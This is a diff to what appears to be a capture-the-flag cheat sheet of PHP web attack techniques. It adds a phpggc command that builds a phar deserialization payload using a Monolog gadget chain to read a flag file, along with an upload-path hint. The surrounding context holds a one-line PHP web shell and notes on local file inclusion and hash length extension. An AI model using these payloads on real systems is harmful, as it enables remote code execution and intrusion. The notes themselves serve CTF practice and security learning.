@@ -6,7 +6,16 @@
     echo system($_GET['c']);
   ?>
   ```
-  
+
+- `phar`
+    - [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
+    - ```php
+      php -d phar.readonly=0 ./phpggc Monolog/RCE1 system \
+      'cat /flag.txt > /var/www/html/flag.txt' \
+      -p phar -o evil.phar
+      ```
+    - Upload path should be `phar://uploads`
+    
 - `preg_replace`
 
   - Local File Inclusion bug.
@@ -42,6 +51,9 @@
 - [`Hash extender`](https://github.com/iagox86/hash_extender)
   - `username=guest&date=2025-04-05T20:02:28+0800&secret_length=8&`
 
+- `composer` (package management tool)
+    - `composer install`
+    - `composer audit`
 
 ### File extension bypass
 
